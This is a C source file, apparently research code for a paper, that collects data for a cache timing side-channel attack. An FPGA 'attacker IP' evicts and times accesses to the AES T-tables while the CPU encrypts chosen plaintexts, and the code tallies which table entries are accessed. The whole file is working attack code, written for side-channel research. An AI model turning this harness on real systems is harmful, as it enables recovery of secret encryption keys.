/**
 * @file data_collection_paper.c
 * @author Matteo Oldani
 * @version 0.1
 * @date 2023-01-18
 * 
 * This code implements the data collection for the 
 * read side channel attack on the FPGA to CPU threat model
 * 
 */

#include <stdio.h>
#include "platform.h"
#include "xil_printf.h"
#include <xreader_timer_evicter.h>
#include "aes.h"

#define ANSI_COLOR_RED     "\x1b[31m"
#define ANSI_COLOR_GREEN   "\x1b[32m"
#define ANSI_COLOR_YELLOW  "\x1b[33m"
#define ANSI_COLOR_BLUE    "\x1b[34m"
#define ANSI_COLOR_MAGENTA "\x1b[35m"
#define ANSI_COLOR_CYAN    "\x1b[36m"
#define ANSI_COLOR_RESET   "\x1b[0m"

#define STRIDE 1

void xil_printf_colored(unsigned value){
    if(value <= 12){
        xil_printf(ANSI_COLOR_GREEN);
        xil_printf("%u  ", value);
        xil_printf(ANSI_COLOR_RESET);
    }else{
        xil_printf("%d  ", value);
    }
}


void rand_ptxt(unsigned char *ptxt, int exclude){
    // i should not be made random
    for(int i=0; i<16; i++){
        if(i==exclude){continue;}
        ptxt[i] = (unsigned char)(rand()%256);
    }
}

int main()
{
    init_platform();

    XReader_timer_evicter evicter;

    volatile unsigned int results[1024];
    unsigned int attack_results[256*256];

    volatile char sum = 0;
    volatile uint32_t * array = (te0);

    unsigned char key[16]  = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
    unsigned char ptxt[16] = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
    unsigned char ctxt[16];

    // Array used to store the access patterns

    int n = 256;

    for(int i=0; i<256; i++){
        for(int j=0; j<256; j++){
            attack_results[i*n + j] = 0;
        }
    }

    xil_printf("\e[1;1H\e[2J");
    xil_printf(ANSI_COLOR_YELLOW);
    xil_printf("################ STARTING THE ATTACK ################\n\n\r");
    xil_printf(ANSI_COLOR_RESET);

    xil_printf("The address of te0 is: 0x%p\n\r", te0);
    xil_printf("The address of te1 is: 0x%p\n\r", te1);
    xil_printf("The address of te2 is: 0x%p\n\r", te2);
    xil_printf("The address of te3 is: 0x%p\n\r", te3);

    int number_of_eviction = 256;
    results[0] = number_of_eviction;
    results[1] = STRIDE * 4;
    results[2] = 0; // not time after eviction

    XReader_timer_evicter_Initialize(&evicter, 0);
    XReader_timer_evicter_Set_c_results(&evicter, (UINTPTR) results);

    //ensure to start with an evicted table
    XReader_timer_evicter_Set_array_r(&evicter, (UINTPTR) array);
    XReader_timer_evicter_Start(&evicter);
    while(!XReader_timer_evicter_IsDone(&evicter));

    // Loop over all the possible positions
    for(int a=0; a<256; a++){
        // Loop over all the possible values of plaintext
        for(int b=0; b<256; b++){
            // print used to track attack execution
            xil_printf("%d %d\r", a, b);

            // Init the plaintext
            ptxt[0] = b;
            rand_ptxt(ptxt, 0);

            // Trigger encryption
            encrypt(key, ptxt, ctxt);

            // Start the attacker IP and then wait
            XReader_timer_evicter_Start(&evicter);
            while(!XReader_timer_evicter_IsDone(&evicter));

            // Check the times for each address
            for(int i=0; i<256;i++){
                if(results[i] == 12){
                    attack_results[i*n + b] +=1;
                }
            }
        }
    }

    // Print the results
    xil_printf("\n\r");
    for(int i=0; i<256; i++){
        for(int j=0; j<256; j++){
            xil_printf("%d ", attack_results[i*n + j]);
        }
        xil_printf("\n\r");
    }

    cleanup_platform();
    return 0;
}
